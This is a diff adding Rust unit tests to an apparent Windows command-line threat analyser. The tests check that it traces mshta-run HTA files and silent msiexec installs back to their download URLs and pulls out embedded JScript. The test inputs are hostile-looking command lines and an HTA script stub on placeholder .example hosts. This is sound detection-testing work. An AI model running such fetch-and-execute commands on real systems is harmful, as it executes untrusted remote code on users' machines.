@@ -7044,6 +7044,52 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_current_dir_hta_resolves_tracked_download_source() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            crate::env::FsEntry::Download {
+                src: "https://mshta-current-dir.example/payload.hta".to_string(),
+            },
+        );
+
+        interpret_line(r"mshta .\payload.hta", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r"mshta .\payload.hta"
+                        && url == "https://mshta-current-dir.example/payload.hta"
+            )),
+            "current-dir mshta target did not resolve tracked source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mshta_current_dir_hta_content_queues_script_block() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            crate::env::FsEntry::Content {
+                content: br#"<html><script language="JScript">var u='https://mshta-current-dir-content.example/payload.js';</script></html>"#.to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"mshta .\payload.hta", &mut env);
+
+        assert!(
+            env.all_extracted_jscript.iter().any(|payload| payload
+                .windows("mshta-current-dir-content.example".len())
+                .any(|window| window == b"mshta-current-dir-content.example")),
+            "current-dir mshta content did not queue script block: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
     fn html_help_direct_url_argument_emits_url_launch_and_lolbas() {
         let raw = r#"hh.exe "https://hh-direct.example/help.chm""#;
         let mut env = Environment::new(&Config::default());
@@ -15228,6 +15274,30 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 )
             }),
             "msiexec local /a package did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_current_dir_package_resolves_tracked_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "setup.msi".to_string(),
+            crate::env::FsEntry::Download {
+                src: "https://msiexec-current-dir.example/setup.msi".to_string(),
+            },
+        );
+
+        crate::interp::interpret_line(r"msiexec /i .\setup.msi /qn", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r"msiexec /i .\setup.msi /qn"
+                        && url == "https://msiexec-current-dir.example/setup.msi"
+            )),
+            "current-dir msiexec package did not resolve tracked source: {:?}",
             env.traits
         );
     }
